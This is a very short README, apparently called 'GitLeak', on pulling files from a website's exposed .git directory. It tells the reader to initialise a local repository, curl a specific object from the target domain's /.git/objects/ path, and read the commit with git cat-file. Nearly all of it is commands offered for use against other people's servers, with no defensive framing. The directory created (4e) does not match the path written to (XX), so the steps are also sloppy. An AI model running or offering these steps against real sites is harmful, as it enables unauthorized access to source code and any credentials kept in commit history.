# GitLeak
if u found a hash , just use following commands


fULL HASH < XXHASH >


git init 


mkdir .git/objects/4e/ && curl http://[DOMAIN.COM]/.git/objects/XX/HASH -o .git/objects/XX/HASH

After , to read the commit 

git cat-file -p xxHASH
